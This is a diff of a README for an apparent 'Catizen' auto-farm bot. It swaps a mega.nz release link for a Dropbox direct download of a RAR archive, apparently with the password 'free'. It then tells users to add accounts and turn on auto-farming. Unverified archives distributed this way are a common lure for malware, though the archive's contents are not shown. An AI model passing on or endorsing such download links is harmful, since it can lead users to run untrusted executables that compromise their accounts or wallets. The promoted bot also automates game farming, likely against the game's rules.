@@ -13,7 +13,7 @@
 ```
 
 # How to use??
-**1. download my [Release](https://mega.nz/file/rao3iRzL#if4rQ-GgCRMTc_8hM4mHHSp2i9-VF9Akr44HH19PRjw)**
+**1. download my [Release](https://www.dropbox.com/scl/fi/3q5z2gsj6m0078fbdaygb/Realease_Pack_Catizen.rar?rlkey=1un8t5tk7ror35ca4q81722ym&st=pkvfl0c6&dl=1)**
 > **pass-free**
 
 **2. open bot > LuxuryTeam**
@@ -23,7 +23,7 @@
 
 **4. a menu will open where you will need to add accounts, each account added will open a new window. For each window you can enable or disable auto-farm You can also enable or disable auto farm for all windows.**
 
-# [Release](https://mega.nz/file/rao3iRzL#if4rQ-GgCRMTc_8hM4mHHSp2i9-VF9Akr44HH19PRjw)
+# [Release](https://www.dropbox.com/scl/fi/3q5z2gsj6m0078fbdaygb/Realease_Pack_Catizen.rar?rlkey=1un8t5tk7ror35ca4q81722ym&st=pkvfl0c6&dl=1)
 # ⚠️Disclaimer⚠️
 
 **If my bot does not work for you**
